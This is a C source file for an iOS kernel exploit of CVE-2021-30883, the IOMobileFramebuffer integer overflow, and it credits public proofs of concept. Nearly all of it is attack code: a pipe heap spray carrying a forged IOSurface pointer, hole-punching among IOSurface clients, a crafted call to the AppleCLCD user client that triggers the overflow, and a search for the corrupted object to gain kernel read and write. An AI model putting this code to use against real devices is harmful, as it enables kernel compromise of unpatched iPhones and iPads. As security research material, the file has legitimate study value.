#include "main.h"
#include "helper/tfp0_krw.h"
#include "helper/offsets.h"
#include "helper/find_port.h"
#include "helper/kutils.h"
#include "helper/kexecute.h"
#include "helper/kcall8.h"
#include "ENABLE_HELPER.h"
#include "IOSurfaceRoot.h"

#include <mach/mach.h>
#include <pthread.h>
#include <sys/utsname.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <stdatomic.h>
#include <string.h>

extern uint32_t gIOSurface_ids[0x1000];
extern uint32_t gIOSurface_id_count;

uint32_t kernel_page_size = 0x4000;

void spinning(void) {
    puts("Spinning here...");
    while(1) {};
}

#if ENABLE_HELPER
static kern_return_t
init_tfp0(void) {
	kern_return_t ret = task_for_pid(mach_task_self(), 0, &tfp0);
	mach_port_t host;
	pid_t pid;

	if(ret != KERN_SUCCESS) {
		host = mach_host_self();
		if(MACH_PORT_VALID(host)) {
			printf("host: 0x%" PRIx32 "\n", host);
			ret = host_get_special_port(host, HOST_LOCAL_NODE, 4, &tfp0);
			mach_port_deallocate(mach_task_self(), host);
		}
	}
	if(ret == KERN_SUCCESS && MACH_PORT_VALID(tfp0)) {
		if(pid_for_task(tfp0, &pid) == KERN_SUCCESS && pid == 0) {
			return ret;
		}
		mach_port_deallocate(mach_task_self(), tfp0);
	}
	return KERN_FAILURE;
}
#endif


io_connect_t get_iomfb_uc(void) {
    kern_return_t ret;
    io_connect_t shared_user_client_conn = MACH_PORT_NULL;
    int type = 0;
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                       IOServiceMatching("AppleCLCD"));
    
    if(service == MACH_PORT_NULL) {
        printf("[-] failed to open service\n");
        return MACH_PORT_NULL;
    }
    
    printf("[*] AppleCLCD service: 0x%x\n", service);

    ret = IOServiceOpen(service, mach_task_self(), type, &shared_user_client_conn);
    if(ret != KERN_SUCCESS) {
        printf("[-] failed to open userclient: %s\n", mach_error_string(ret));
        return MACH_PORT_NULL;
    }
    
    printf("[*] AppleCLCD userclient: 0x%x\n", shared_user_client_conn);
    
    return shared_user_client_conn;
}

int increase_file_limit() 
{
    int err = 0;
    struct rlimit rl = {};
    
    err = getrlimit(RLIMIT_NOFILE, &rl);
    if (err != 0)
    {
        return err;
    }

    rl.rlim_cur = 10240;
    rl.rlim_max = rl.rlim_cur;
    err = setrlimit(RLIMIT_NOFILE, &rl);
    if (err != 0)
    {
        return err;
    }
    
    err = getrlimit(RLIMIT_NOFILE, &rl);
    if (err != 0)
    {
        return err;
    }
    
    return 0;
}

static void set_nonblock(int fd) 
{
    int flags = fcntl(fd, F_GETFL);
    flags |= O_NONBLOCK;
    fcntl(fd, F_SETFL, flags);
}

int *create_pipes(int total_pipes) {
	size_t total_pipes_size = total_pipes * 2 * sizeof(int);
    int *pipefds = malloc(total_pipes_size);
	bzero(pipefds, total_pipes_size);

	for (size_t i = 0; i < total_pipes; i++) 
    {
        pipefds[i * 2] = -1;
        pipefds[i * 2 + 1] = -1;
        
        int error = pipe(&pipefds[i * 2]);
        if (error != 0 ||
            pipefds[i * 2] < 0 ||
            pipefds[i *  + 1] < 0)
        {
            close(pipefds[i * 2]);
            close(pipefds[i * 2 + 1]);

            total_pipes = i;
            break;   
        }

        set_nonblock(pipefds[i * 2 + 1]);
    }

	return pipefds;
}

int write_data_pipes(int *pipefds, int total_pipes, void* data, size_t data_sz) {
	void *pipebuf = malloc(kernel_page_size);
    bzero(pipebuf, kernel_page_size);

	memcpy(pipebuf, (void *)data, data_sz);
    for (int i = 0; i < total_pipes; i++)
    {
		int rfd = pipefds[2 * i];
        int wfd = pipefds[2 * i + 1];
		
		// needed to identifying pipe's wfd, rfd
		*(uint16_t *)(pipebuf + 0x3f00) = rfd;
		*(uint16_t *)(pipebuf + 0x3f02) = wfd;

        size_t written = write(wfd, pipebuf, kernel_page_size - 1);
        
        if (written != kernel_page_size - 1)
        {
            total_pipes = i;
            printf("total_pipes is now: %d", total_pipes);
            break;
        }
    }

	free(pipebuf);

	return 0;
}

int clean_pipes(int *pipefds, int total_pipes) {
	if (pipefds)
    {
        for (int i = 0; i < total_pipes; i++)
        {
            close(pipefds[i]);
        }

        free(pipefds);
    }

	return 0;
}

#if ENABLE_HELPER && PROFILLING_KHEAP_DATA_BUFFERS
int obtain_pipes_kaddr(int *pipefds, int total_pipes) {
	
	uint64_t p_fd = tfp0_kread64(proc_of_pid(getpid()) + off_p_pfd); 
	printf("p_fd = 0x%llx\n", p_fd);;
	uint64_t fd_ofiles = tfp0_kread64(p_fd);
	printf("fd_ofiles = 0x%llx\n", fd_ofiles);

	uint64_t last_pipe_base = 0;

	for (int i = 0; i < total_pipes; i++) {
        int rfd = pipefds[2 * i];
		uint64_t rpipe_fp = tfp0_kread64(fd_ofiles + rfd * 8);
		uint64_t r_fp_glob = tfp0_kread64(rpipe_fp + off_fp_fglob);
		uint64_t rpipe = tfp0_kread64(r_fp_glob + off_fg_data); 
		uint64_t pipe_base = tfp0_kread64(rpipe + off_pb_buffer); 
		printf("KHEAP_DATA_BUFFERS KALLOCATED ADDR = 0x%llx\n", pipe_base);
		
		last_pipe_base = pipe_base;
	}

	printf("[!] Try setting macro KHEAP_DATA_MAPPABLE_LOC to 0x%llx\n", last_pipe_base - (0x4000*(total_pipes / 2)));

	return 0;
}
#endif

// pipe_info_t *kalloc_via_pipe(size_t size) {
//     pipe_info_t *info = calloc(1, sizeof(pipe_info_t));
//     info->user_buffer = calloc(1, size);
//     info->size = size;
//     pipe(info->fd);

//     write(info->fd[1], info->user_buffer, size);
//     read(info->fd[0], info->user_buffer, size);

//     uint64_t fd = kread_ptr(proc_self() + koffsetof(proc, fd));
//     uint64_t ofiles = kread_ptr(fd);
//     uint64_t fileproc = kread_ptr(ofiles + info->fd[0] * 8);
//     uint64_t fileglob = kread_ptr(fileproc + 0x8);
//     uint64_t data = kread_ptr(fileglob + 0x38);
//     info->kern_buffer = kread_ptr(data + 0x10);
//     return info;
// }

// void kfree_via_pipe(pipe_info_t *info) {
//     close(info->fd[0]);
//     close(info->fd[1]);
//     free(info->user_buffer);
//     free(info);
// }

int main(int argc, char *argv[], char *envp[]) {

	offsets_init();

#if ENABLE_HELPER
	if(init_tfp0() == KERN_SUCCESS) {
		printf("tfp0: 0x%" PRIx32 "\n", tfp0);

		int r = tfp0_get_kbase(&tfp0_kbase);
    	printf("tfp0_get_kbase ret: %d, tfp0_kbase: 0x%llx, tfp0_kslide: 0x%llx\n", r, tfp0_kbase, tfp0_kslide);

		init_kexecute();
#endif

	increase_file_limit();
#if ENABLE_HELPER && PROFILLING_KHEAP_DATA_BUFFERS
	int total_pipes = 0x300;
	int *pipefds = create_pipes(total_pipes);

	void *pipe_data = malloc(kernel_page_size);
	memset(pipe_data, 0x42, kernel_page_size);
	write_data_pipes(pipefds, total_pipes, pipe_data, kernel_page_size);

	obtain_pipes_kaddr(pipefds, total_pipes);

	clean_pipes(pipefds, total_pipes);

	goto cleanup;
#endif
	printf("Exploiting CVE-2021-30883 (first journey from poc to exploit by @wh1te4ever!)\n");

	// pipe spray
	int total_pipes = 0x300;
	int *pipefds = create_pipes(total_pipes);

	void *pipe_data = malloc(kernel_page_size);
	memset(pipe_data, 0x42, kernel_page_size);

	*(uint64_t *)(pipe_data + 0x10 + 0xC0) = (KHEAP_DATA_MAPPABLE_LOC + 0x2000) - 0x10; //will be read by IOSurface::get_use_count, will read data from kernel addr(KHEAP_DATA_MAPPABLE_LOC + 0x2000) 

	*(uint64_t *)(pipe_data + 0x2000) = 0x7172737475767778;

	write_data_pipes(pipefds, total_pipes, pipe_data, kernel_page_size);

	// iosurface 
	io_connect_t iomfb_uc = get_iomfb_uc();
	mach_port_t uc = IOSurfaceRoot_init();

	#if ENABLE_HELPER
		uint64_t IOSurfaceRootUserClient_port = find_port(uc);
		uint64_t IOSurfaceRootUserClient_addr = tfp0_kread64(IOSurfaceRootUserClient_port + off_ipc_port_ip_kobject);
		uint64_t surfaceClients = tfp0_kread64(IOSurfaceRootUserClient_addr + 0x118);

		// tfp0_khexdump(surfaceClients, 0x1000);
		// spinning();
	#endif

	//trigger oob write for kext.kalloc.160
	//Thanks @AmarSaar for providing detail write-up and poc; https://github.com/saaramar/IOMFB_integer_overflow_poc/blob/main/poc/poc.c
	kern_return_t ret = KERN_SUCCESS;
    size_t input_size = 0x180;
    
    uint64_t scalars[2] = { 0 };

    char *input = (char*)malloc(input_size);
    memset(input, 0x41, input_size);

	*(uint64_t *)(input + 0x150) = 0x8182838400000000 + ((KHEAP_DATA_MAPPABLE_LOC+0x10) & 0xffffffff);
	*(uint64_t *)(input + 0x158) = 0x1337133813391340;	
	*(uint64_t *)(input + 0x154) = KHEAP_DATA_MAPPABLE_LOC+0x10;	// to control IOSurface ptr

#if 0
	*(uint64_t *)(input + 0x150) = 0x8182838485868788;
	*(uint64_t *)(input + 0x158) = 0x1337133813391340;	// to control IOSurface ptr

[0xffffffe4cc610fa0+0x000] 41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |  AAAAAAAAAAAAAAAA 
[0xffffffe4cc610fa0+0x010] 41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |  AAAAAAAAAAAAAAAA 
[0xffffffe4cc610fa0+0x020] 41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |  AAAAAAAAAAAAAAAA 
[0xffffffe4cc610fa0+0x030] 41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |  AAAAAAAAAAAAAAAA 
[0xffffffe4cc610fa0+0x040] 88 87 86 85 40 13 39 13  38 13 37 13 41 41 41 41  |  ....@.9.8.7.AAAA <--
[0xffffffe4cc610fa0+0x050] 41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |  AAAAAAAAAAAAAAAA 
[0xffffffe4cc610fa0+0x060] 41 41 41 41 00 00 00 00  00 00 00 00 00 00 00 00  |  AAAA............ 
#endif

	int *pArr = (int*)input;
	pArr[0] = 0x3;          // sub-sub selector
    pArr[1] = 0xffffffff;   // has to be non-zero
    pArr[2] = 0x40000000;   // #iterations in the outer loop (new_from_data)
    pArr[3] = 2;
    pArr[8] = 2;
    pArr[89] = 4*10;        // #iterations in the inner loop (set_table)
	
	// punch hole kext.kalloc.160, free!
	// Thanks @jaakerblom for release Zer0con 2022 slide, that gives me idea!
	uint32_t last_id = IOSurfaceRoot_cause_array_size_to_be_0x1000(uc);
	for (uint32_t surf_idx = 0; surf_idx < gIOSurface_id_count; surf_idx++)
	{
		if(surf_idx % 2 == 0) {
	    	IOSurfaceRoot_release_surface(uc, gIOSurface_ids[surf_idx]);
			gIOSurface_ids[surf_idx] = 0;
		}
	}

	for (int i = 0; i < 1; ++i) {
		ret = IOConnectCallMethod(iomfb_uc, 78,
                            scalars, 2,
                            input, input_size,
                            NULL, NULL,
                            NULL, NULL);
		// spinning();
#if ENABLE_HELPER
		//find out where corruption
		for(int i = 0; i < 0x1000/8; i++) {
			uint64_t surfaceClient = tfp0_kread64(surfaceClients + i*8);
			if(surfaceClient != 0) {
				uint64_t sig = tfp0_kread64(surfaceClient);
				if(sig == 0x4141414141414141) {
					puts("Found corrupted surfaceClient!");
					tfp0_khexdump(surfaceClient, 160);
					// spinning();
					break;
				}
			}
		}
#endif
	}

	uint32_t surf_id_krw = 0;
	for (uint32_t surf_idx = 0; surf_idx < gIOSurface_id_count; surf_idx++)
	{
		if((surf_idx % 2 == 1) && gIOSurface_ids[surf_idx] != 0) {
			uint32_t surf_id = gIOSurface_ids[surf_idx];
			uint32_t val = IOSurfaceRoot_get_surface_use_count(uc, surf_id);
			if(val != 0) {
				printf("val = 0x%x\n", val);
				printf("Found corrupted IOSurfaceClient's surf_id = 0x%x", surf_id);
				surf_id_krw = surf_id;
				break;
			}
		}
	}
	spinning();




cleanup:
#if ENABLE_HELPER
		term_kexecute();
		mach_port_deallocate(mach_task_self(), tfp0);
	}
#endif
}
